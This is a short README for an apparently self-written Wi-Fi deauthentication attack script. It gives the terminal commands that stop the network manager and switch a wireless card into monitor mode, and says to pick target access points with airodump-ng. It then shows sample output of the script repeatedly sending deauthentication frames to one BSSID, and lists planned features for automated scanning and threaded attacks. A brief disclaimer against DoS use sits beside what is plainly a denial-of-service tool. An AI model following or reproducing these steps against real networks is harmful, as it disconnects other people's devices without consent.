# Deauth Attack
You must not use THIS as DoS in case you did not know...

## Set up
Open your console or terminal, and follow STRICTLY the order.

```
# service network-manager stop
# ifconfig wlan0 down
# iwconfig wlan0 mode monitor
# ifconfig wlan0 up
```

## Target AP
You should have found some BSSID of disgusting APs using "airodump-ng" and so on...


## Attacking

```
# python deauth_attack.py
Attacking(c0:25:a2:f5:25:d2): Send the Deauthentication flame:)
Attacking(c0:25:a2:f5:25:d2): Send the Deauthentication flame:)
Attacking(c0:25:a2:f5:25:d2): Send the Deauthentication flame:)
...
```

## Waiting update...

+ Automated BSSID scan
+ Threading deauth attacks
